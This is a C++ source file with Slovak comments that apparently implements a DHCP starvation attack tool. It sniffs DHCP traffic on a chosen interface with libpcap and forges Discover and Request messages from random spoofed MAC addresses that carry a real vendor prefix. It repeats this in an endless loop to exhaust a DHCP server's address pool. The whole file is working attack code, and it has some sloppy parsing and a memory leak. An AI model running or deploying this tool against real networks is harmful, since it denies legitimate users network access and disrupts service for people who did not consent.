#include <pcap.h>
#include <cstdlib>
#include <iostream>
#include "Util.h"
#include <getopt.h>
#include <ctime>
#include <cstring>
#include "Common.h"
#include <unistd.h>
#include <map>
#include <chrono>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <signal.h>

#include "ClientMessage.h"

using namespace std;

static const int RESOLUTION_TIMEOUT_MS = 2000;

struct TParam {
	string devName;
	pcap_t *handle;
};

/**
 * Overenie ci bol zadany vstupny parameter.
 */
int extractArguments(int argc, char *argv[], string &dev)
{
	int c;

	while ((c = getopt(argc, argv, "i:")) != -1) {
		switch (c){
		case 'i':
			dev = optarg;
			break;
		default:
			return -1;
		}
	}

	return 0;
}

/**
 * Overenie ci zadane rozhranie je dostupne, ak nie chyba.
 */
int checkExistsInterface(const string &dev)
{
	set<string> allDevices;
	if (Util::allDevices(allDevices) < 0)
		return -1;

	auto it = allDevices.find(dev);
	if (it == allDevices.end()) {
		string err;
		err += "unknown device name: ";
		err += dev;
		err += "\n";
		err += "all found devices: ";

		if (allDevices.size() > 1) {
			for (const auto &dev : allDevices)
				err += dev + ", ";

			// remove last two chars
			err.pop_back();
			err.pop_back();
		}
		else {
			err += "ziadne zariadenie nebolo najdete";
		}

		cerr << err << endl;
		return -1;
	}

	return 0;
}

/**
 * Inicializacia pcap handleru a filtra pre odchytavanie
 * komunikacie na udp porte 68.
 */
int initPcapHandle(TParam *t)
{
	char errBuffer[PCAP_ERRBUF_SIZE] = {0};

	// otvorenie pcap handleru
	t->handle = pcap_open_live(
			t->devName.c_str(), // device
			512,                // snapLen
			1,                  // promisc
			1000,               // to_ms
			errBuffer           // error buffer
		);

	// kontrola otvorenie pcap handleru
	if (strlen(errBuffer) > 0) {
		cerr << errBuffer << endl;
		return -1;
	}

	// nastavenie filtra pre filtrovanie sprav
	struct bpf_program filter = {0};
	string filterExpression = "udp port 68";

	int ret = pcap_compile(
			t->handle,
			&filter,
			filterExpression.c_str(),
			0,
			PCAP_NETMASK_UNKNOWN
		);

	if (ret == -1) {
		cerr << "pcap_compile: ";
		cerr << pcap_geterr(t->handle) << endl;
		return -2;
	}

	if (pcap_setfilter(t->handle, &filter) == -1) {
		cerr << "pcap_setfilter: ";
		cerr << pcap_geterr(t->handle) << endl;
		return -2;
	}

	return 0;
}

/**
 * Inicializacia potrebnych osucasti pre dchytavanie paketov
 * na danom rozhrani a udp porte 68.
 */
int init(TParam *t, int argc, char *argv[])
{
	// nacitanie parametra
	if (extractArguments(argc, argv, t->devName) < 0) {
		cerr << "invalid arguments" << endl;
		return -1;
	}

	// overenie existencie zadaneho rozhrania
	if (checkExistsInterface(t->devName) < 0) {
		cerr << "problem with interface" << endl;
		return -2;
	}

	// otvorenie handleru a nastavenie filtra
	if (initPcapHandle(t) < 0) {
		cerr << "problem with pcap handler" << endl;
		return -3;
	}

	return 0;
}

/**
 * Vygenerovanie nahodnej mac adresy s existujucim
 * vyrobcom.
 */
vector<uint8_t> generateFakeMAC()
{
	vector<uint8_t> mac;

	// Organisationally unique identifier
	// Shenzhen ViewAt Technology Co.,Ltd.
	mac.push_back(0xe0);
	mac.push_back(0x43);
	mac.push_back(0xdb);

	// random
	mac.push_back(Util::randomUint8());
	mac.push_back(Util::randomUint8());
	mac.push_back(Util::randomUint8());

	return mac;
}

DHCPDiscovery buildDiscovery(
	const vector<uint8_t> &l2MAC,
	const vector<uint8_t> &fakeMAC,
	uint32_t transactionID)
{
	DHCPDiscovery msg;
	msg.setEthMAC(l2MAC);
	msg.setFakeClientMAC(fakeMAC);
	msg.setTransactionID(transactionID);

	return msg;
}

DHCPRequest buildRequest(
	const vector<uint8_t> &l2MAC,
	const vector<uint8_t> &fakeMAC,
	uint32_t transactionID,
	uint8_t *yourIPAddr,
	uint8_t *serverIPAddr)
{
	DHCPRequest request;
	request.setFakeClientMAC(fakeMAC);
	request.setTransactionID(transactionID);

	request.setEthMAC(l2MAC);
	request.setFakeClientMAC(fakeMAC);

	for (size_t i = 0; i < 4; i++) {
		request.op1payload[i] = yourIPAddr[i];
		request.op2payload[i] = serverIPAddr[i];
	}

	return request;
}

/**
 * Zistenie o aky typ dhcp spravy sa jedna a o
 * identifikaciu servera.
 */
DHCPInfo extractPacketInfo(uint8_t *options, size_t size)
{
	DHCPInfo info;

	for (size_t m = 0; m < size; m++) {
		switch (*options) {
		case 0x35:     // DHCP Message type
			options++; // length
			options++; // data
			info.dhcpMessageType = *options;
			options++;
			break;

		case 0x36:     // DHCP server identifier
			options++; // move to length
			options++; //move to value

			for (size_t p = 0; p < 4; p++)
				info.dhcpServerIdentifier[p] = *(options + p);

			options = options + 4;

		default:
			options++;
			uint8_t length = *options;
			options++;
			options += length;
		}
	}

	return info;
}

void oneResolution(TParam *t, const vector<uint8_t> &l2MAC)
{
	const vector<uint8_t> fakeMAC = generateFakeMAC();
	const uint64_t startTime = Util::timestamp();

	const DHCPDiscovery d =
			buildDiscovery(l2MAC, fakeMAC, Util::randomUint32());
		pcap_sendpacket(t->handle, (const u_char *) &d, sizeof(d));

	while (true) {
		auto buf = new uint8_t[1024];
		struct pcap_pkthdr header = {0};

		// nacitanie dalsieho prijateho packetu
		buf = (uint8_t *) pcap_next(t->handle, &header);

		// maximalne cakanie na jedno pridelenie adresy
		// od odoslania discovery az po prijatie ACK
		// ak sa to nepodari odosiela sa dalsi discovery
		// a proces zacina odznova
		if (Util::timestamp() - startTime > RESOLUTION_TIMEOUT_MS)
			break;

		// ak neprisiel ziaden paket, skusime prijat znova
		if (header.caplen == 0) {
			usleep(50 * 1000); // 50 ms
			continue;
		}

		// rozparsovanie prijatej spravy (len cast)
		DHCPMessage *offer = DHCPMessage::fromRaw(buf, header.caplen);

		// zistenie typu dhcp spravy a dhcp servera zo spravy
		DHCPInfo info = extractPacketInfo(
				buf + sizeof(DHCPMessage),
				header.caplen - sizeof(DHCPMessage)
			);

		// spracovanie DHCP Offer
		if (info.dhcpMessageType == 2) {
			DHCPRequest request;
			request.setFakeClientMAC(fakeMAC);
			request.setTransactionID(offer->dhcpHeader.transactionID);

			request.setEthMAC(l2MAC);
			request.setFakeClientMAC(fakeMAC);

			for (size_t p = 0; p < 4; p++) {
				request.op1payload[p] = offer->dhcpHeader.yourIPAddr[p];
				request.op2payload[p] = offer->dhcpHeader.serverIPAddr[p];
			}

			const DHCPRequest r = buildRequest(
					l2MAC,
					fakeMAC,
					offer->dhcpHeader.transactionID,
					offer->dhcpHeader.yourIPAddr,
					offer->dhcpHeader.serverIPAddr
				);

			pcap_sendpacket(
				t->handle, (const u_char *) &r, sizeof(r));
		}
		// ACK
		else if (info.dhcpMessageType == 3) {
			break;
		}
	}
}


bool m_stop = false;
void signalHandler(int signum)
{
	cerr << "koniec aplikacie" << endl;
	m_stop = true;
}

int main(int argc, char *argv[])
{
	signal(SIGINT, signalHandler);

	srand(time(nullptr));
	vector<uint8_t> senderMAC;
	TParam t;

	// inicializacia sucasti pre komunikaciu
	if (init(&t, argc, argv) < 0)
		return EXIT_FAILURE;

	// zistenie mac adresy odosielatela
	if (Util::MACAddress(t.devName, senderMAC) < 0) {
		cerr << "problem with detect sender MAC address"  << endl;
		return EXIT_FAILURE;
	}

	while (!m_stop) {
		oneResolution(&t, senderMAC);
		usleep(50 * 1000); // 50 ms
	}

	pcap_close(t.handle);
}
